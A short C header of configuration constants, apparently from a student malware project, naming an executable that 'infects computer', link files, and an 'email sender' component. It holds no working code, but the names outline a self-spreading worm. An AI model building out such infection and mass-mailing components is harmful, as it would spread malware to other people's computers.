/**
* Developer: eloo tech (BSSE-0509, IIT, DU)
* Date: 21.juil.2021, 21.juil.2021, 21.juil.2021
**/

#define FOLDER_NAME "elootech"  //containing folder
#define RUN_FILE_NAME "Elootech.exe"  //main run file
#define RUN_LINK_NAME "ElooTech.lnk"  //starter link
#define INFECT_FILE_NAME "Elootech.exe"  //infects computer
#define INFECT_LINK_NAME "Elootech.lnk"  //link file
#define EMAIL_SENDER_FILE_NAME "ElooTech.exe"  //email sender
